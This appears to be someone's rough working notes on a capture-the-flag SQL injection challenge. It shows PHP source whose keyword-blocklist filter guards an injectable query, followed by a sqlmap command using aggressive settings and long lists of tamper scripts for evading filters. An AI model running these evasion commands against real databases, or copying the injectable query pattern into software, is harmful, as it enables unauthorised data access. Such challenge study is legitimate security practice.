<?php error_reporting(0); //Turn off error reporting on runtime
require 'config.php';//include from server 

class db extends Connection {
    public function waf($s) {
        if (preg_match_all('/'. implode('|', array(   //preg_match_all = Find all occurence of given string
            '[' . preg_quote("(*<=>|'&-@") . ']',     //
            'select', 'and', 'or', 'if', 'by', 'from', 
            'where', 'as', 'is', 'in', 'not', 'having'
        )) . '/i', $s, $matches)) die(var_dump($matches[0]));
        return json_decode($s);
    }

    public function query($sql) {
        $args = func_get_args();//Get the arguments in array
        unset($args[0]); //Destroy arg[0]
        return parent::query(vsprintf($sql, $args));
    }
}

$db = new db();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $obj = $db->waf(file_get_contents('php://input'));
    $db->query("SELECT note FROM notes WHERE assignee = '%s'", $obj->user);
} else {
    die(highlight_file(__FILE__, 1));
}
?>

$obj->user = "",""
"SELECT note FROM notes WHERE assignee = '%s'"

sudo sqlmap -r request.txt --level 5 --risk 3  --identify-waf --random-agent --threads=10 --tamper=apostrophemask,apostrophenullencode,appendnullbyte,bluecoat,chardoubleencode,charencode,charunicodeencode,escapequotes,halfversionedmorekeywords,informationschemacomment,modsecurityversioned,overlongutf8,percentage,unmagicquotes,overlongutf8more,bluecoat,charunicodeescape,commalesslimit,commalessmid,commentbeforeparentheses,concat2concatws,equaltolike,greatest,hex2char,htmlencode,ifnull2casewhenisnull,ifnull2ifisnull


--data {"user":*} 

apostrophemask,apostrophenullencode,appendnullbyte,bluecoat,chardoubleencode,charencode,charunicodeencode,escapequotes,halfversionedmorekeywords,informationschemacomment,modsecurityversioned,overlongutf8,percentage,unmagicquotes,overlongutf8more


apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,charunicodeescape,commalesslimit,commalessmid,commentbeforeparentheses,concat2concatws,equaltolike,escapequotes,greatest,halfversionedmorekeywords,hex2char,htmlencode,ifnull2casewhenisnull,ifnull2ifisnull,informationschemacomment,least,lowercase,luanginx,modsecurityversioned,modsecurityzeroversioned,multiplespaces,overlongutf8,overlongutf8more,percentage,plus2concat,plus2fnconcat,randomcase,randomcomments,sp_password,space2comment,space2dash,space2hash,space2morecomment,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,substring2leftright,symboliclogical,unionalltounion,unmagicquotes,uppercase,varnish,versionedkeywords,versionedmorekeywords,xforwardedfor
